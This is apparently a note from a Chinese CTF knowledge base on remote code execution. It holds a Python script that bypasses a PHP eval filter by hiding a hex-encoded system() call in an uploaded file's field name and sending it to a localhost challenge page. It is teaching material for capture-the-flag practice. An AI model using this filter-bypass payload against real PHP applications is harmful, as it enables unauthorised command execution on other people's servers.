# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/命令执行.md
# TITLE: 什么是rce
# CATEGORY: web

import requests
from io import BytesIO

payload = "system('ls /tmp');".encode('hex')
files = {
  payload: BytesIO('sky cool!')
}

r = requests.post('http://localhost/skyskysky.php?code=eval(hex2bin(array_rand(end(get_defined_vars()))));', files=files, allow_redirects=False)

print r.content
